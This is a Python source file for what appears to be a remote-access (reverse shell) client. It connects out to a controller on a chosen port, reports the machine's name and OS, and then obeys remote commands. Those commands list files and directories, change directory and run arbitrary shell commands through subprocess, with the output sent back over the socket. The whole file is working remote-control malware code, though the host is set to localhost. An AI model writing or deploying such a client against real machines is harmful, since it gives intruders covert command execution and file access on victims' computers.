import socket, os, sys, time, base64, extra, platform, subprocess, pathlib
data = [os.environ['COMPUTERNAME'], platform.system()]

currentDirectory = os.getcwd()

def connect(host, port):
	notConnected = True
	while notConnected:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

		try:
			s.connect((host, port))
			#print("Connected: Sending Data:", "Stuff")
			#str(os.environ['COMPUTERNAME']) + ',' + platform.system()
			#s.send("PC 1,Windows")
			notConnected = False

		except:
			pass


	s.send((str(data[0]) + "," + str(data[1])).encode("utf8"))
	return s

def checkCommand(data, command):
	if data[:len(command)] == command:
		return [True, data[len(command):]]
	else:
		return [False, ""]

def send(conn, data):
	try:
		conn.send(data.encode("utf8"))
	except:
		pass
port = int(input("Port: "))
while True:


	conn = connect('localhost', port)

	active = True

	while active:
		try:
			data = conn.recv(1024).decode()
			if data == "":
				continue

			if data == "Checking If Alive":
				continue

			if data == "disconnect":
				active = False
				print("Disconnecting Client")
				conn.close()
				continue

			if data == "getCwd":
				send(conn, currentDirectory)
				continue

			if data == "getFiles":
				filesList = pathlib.Path(currentDirectory)
				files = []
				for file in filesList.iterdir():
					if os.path.isfile(file.name):
						files.append(file.name)

				files = ",".join(files)

				send(conn, files)
				continue

			if data == "getDirs":
				filesList = pathlib.Path(currentDirectory)
				files = []
				files.append("..")
				for file in filesList.iterdir():
					if not os.path.isfile(file.name):
						files.append(file.name)

				files = ",".join(files)

				send(conn, files)
				continue

			if checkCommand(data, "cd: ")[0]:
				args = checkCommand(data, "cd: ")[1]
				if os.path.isdir(args):
					print("Changing Directory To: " + args)
					os.chdir(args)
					currentDirectory = os.getcwd()

			if checkCommand(data, "shell: ")[0]:
				args = checkCommand(data, "shell: ")[1]

				if checkCommand(args, "cd ")[0]:
					try:
						os.chdir(checkCommand(args, "cd ")[1])
						currentDirectory = os.getcwd()
						send(conn, "cwd: " + currentDirectory)
					except Exception as e:
						send(conn, "Could Not Change To Directory: " + checkCommand(args, "cd ")[1] + ", " + str(e))
					continue

				try:
					output = subprocess.run(args, shell=True, check=True, capture_output=True).stdout.decode()
					conn.send(output.encode("utf8"))
				except Exception as e:
					print("Error Interpreting Command")
					conn.send(("Command '" + args + "' Is Invalid: " + str(e)).encode("utf8"))
		except Exception as e:
			print(e)
			active = False
			try:
				conn.close()
			except:
				pass